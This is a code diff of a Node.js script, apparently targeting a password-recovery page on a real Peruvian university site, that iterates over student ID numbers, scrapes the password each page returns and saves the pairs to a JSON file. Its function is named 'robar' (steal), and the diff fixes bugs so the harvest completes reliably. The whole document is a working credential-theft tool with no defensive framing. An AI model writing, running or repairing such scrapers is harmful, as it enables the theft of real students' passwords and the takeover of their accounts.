@@ -7,7 +7,7 @@ var url = 'http://www.unap.edu.pe/cidiomas/index.php?i=0&z=1&pag=recordar_pas&m=
 const desde = 140000;
 const hasta = 140010;
 
-var consultasRestantes = hasta-desde;
+var consultasRestantes = hasta-desde+1;
 
 function robar(){
   var codigos = [];
@@ -33,9 +33,12 @@ function robar(){
             codigo: codigo,
             password: $('b').text()
           })
+        }else{
+            console.log(codigo,'null');
         }
       }
       consultasRestantes = consultasRestantes - 1;
+      comprobarFinalizacion();
     })
   });
 
@@ -43,17 +46,11 @@ function robar(){
 
 function comprobarFinalizacion(){
   console.log('restantes=',consultasRestantes);
-  if(consultasRestantes==0){
-    
+  if(consultasRestantes==0){ 
     fs.writeFile('codigos.json', JSON.stringify(robados), function(err){
       console.log('Archivo escrito correctamente! - verifique el archivo codigos.json');
     })
-  }else{
-    setTimeout(function(){
-      comprobarFinalizacion();
-    },1000);
   }
 }
 
 robar();
-comprobarFinalizacion();
